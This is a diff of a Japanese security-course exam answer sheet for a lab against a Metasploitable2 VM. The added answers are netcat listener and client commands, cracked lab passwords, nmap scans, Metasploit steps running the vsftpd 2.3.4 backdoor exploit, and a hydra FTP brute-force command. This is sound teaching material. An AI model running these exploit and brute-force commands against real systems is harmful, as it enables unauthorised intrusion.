@@ -1,25 +1,30 @@
 # CyberSecurity I Exam 2020 回答用紙
 
+[ip]
+kali: 192.168.33.10
+metasploitable2: 192.168.33.5
+
 ## 問1 [netcat]
 
 ### サーバー側コマンド
 
 ```sh
 # ここに回答を記述
-
+nc -lvp 5000
 ```
 ### クライアント側コマンド
-
+ 
 ```sh
 # ここに回答を記述
-
+nc 192.168.33.5(server ip) 5000
 ```
 
 ## 問2 [Password Crack]
 
 ```md
 <!--  ここに回答を記述 -->
-
+- omas:itcollege
+- omas2:foobar
 ```
 
 ## 問3 [Port Scanner]
@@ -28,6 +33,7 @@
 
 ```sh
 # ここに回答を記述
+nmap -sP 192.168.33.0/25
 
 ```
 
@@ -35,18 +41,23 @@
 
 ```sh
 # ここに回答を記述
-
+nmap -sV -p- 192.168.33.5
 ```
 
 ## 問4 [Metasploit Framework]
 
 ```sh
 # ここに回答を記述
-
+msfconsole
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+show options
+set RHOST 192.168.33.5
+run
 ```
 
 ## 問5 [Online Password Cracker]
-
+hydra -L user.list -P passwd.list -t 64 192.168.33.5 ftp
 
 ### 1. コマンド
 
